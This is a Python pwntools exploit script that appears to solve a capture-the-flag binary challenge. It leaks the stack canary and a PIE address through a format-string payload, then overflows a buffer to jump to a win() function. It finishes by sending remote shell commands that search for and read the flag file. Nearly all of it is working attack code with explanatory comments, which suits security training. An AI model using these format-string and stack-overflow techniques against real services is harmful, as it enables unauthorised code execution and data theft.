#!/usr/bin/env python3
from pwn import *

# From checksec:
# Stack:      Canary found  =>  we should bypass the stack canary to exploit the buffer overflow vulnerability
# PIE:        PIE enabled   =>  addresses are NOT static and CANNOT be used directly in the exploit
#                               (because the program is loaded into a different location in memory each time)

exe = context.binary = ELF("./space_station", checksec=False)

CANARY_IDX = 15     # the canary is found at index 15 (easily observable since it has the LSB = 00)
PIE_LEAK_IDX = 17   # usually, PIE addresses on Linux start with 0x55... or 0x56...
                    # in this case, a leaked address starting with 0x55... or 0x56... is found at index 17

OFFSET_TO_CANARY = 72   # 64 bytes for the buffer + 8 bytes for alignment
OFFSET_TO_RIP = OFFSET_TO_CANARY + 8 + 8    # 8 bytes for the canary and 8 bytes for the saved RBP

leaked_ret_gadget = 0x00101a  # obtained by running:  ROPgadget --binary ./space_station | grep ": ret$"

leaked_win_offset = 0x001275  # this is just the fixed offset of the win() function in the binary,
                              # obtained by running "nm ./space_station | grep win".
                              # We still need to discover the actual address of win() at runtime by adding this offset to the pie_base address of the binary
                              
# GOAL: find the actual fixed offset, from which we can compute the real address of win() at runtime;
#       it can be used to bypass ASLR / PIE because the offset remains always constant across different runs,
#       what changes is only the base address of the binary.
#
# To find the fixed offset, run the binary in local using pwndbg and obtain the necessary information:
local_pie_base = 0x555555554000   # obtained by running "piebase" inside pwndbg (after "break vuln" and "run" commands)
local_pie_leak = 0x55555555539e   # the leaked address of the PIE binary is obtained by sending the format string payload
                                  # inside pwndbg and analyzing the output (the leaked address is found at index 17)
# Fixed offset between the leaked address and the base address of the binary
fixed_offset = local_pie_leak - local_pie_base   # this will be reused later (very important!)


p = remote("offsec.m0lecon.it", 13502)

p.recvuntil(b"Enter your astronaut ID: ")

p.sendline(f"%{CANARY_IDX}$lx.%{PIE_LEAK_IDX}$lx".encode())
leak = p.recvline().strip()
canary = int(leak.split(b".")[0], 16)
pie_leak = int(leak.split(b".")[1], 16)
log.info(f"canary = {canary:#x}")
log.info(f"pie_leak = {pie_leak:#x}")

real_pie_base = pie_leak - fixed_offset   # compute the real base address of the binary at runtime

win_addr = real_pie_base + leaked_win_offset   # compute the real address of win() at runtime
ret_gadget = real_pie_base + leaked_ret_gadget  # compute the real address of the ret gadget at runtime

p.recvuntil(b"\nSubmit your mission log: ")
payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # 8 bytes for the saved RBP
    p64(ret_gadget),    # ret gadget for alignment
    p64(win_addr),
)

p.send(payload)

p.sendline(b"find / -name flag")    # find the path of the flag file (to be used in the next command)
p.sendline(b"cat /home/user/flag")  # insert here the path of the flag file

p.interactive()
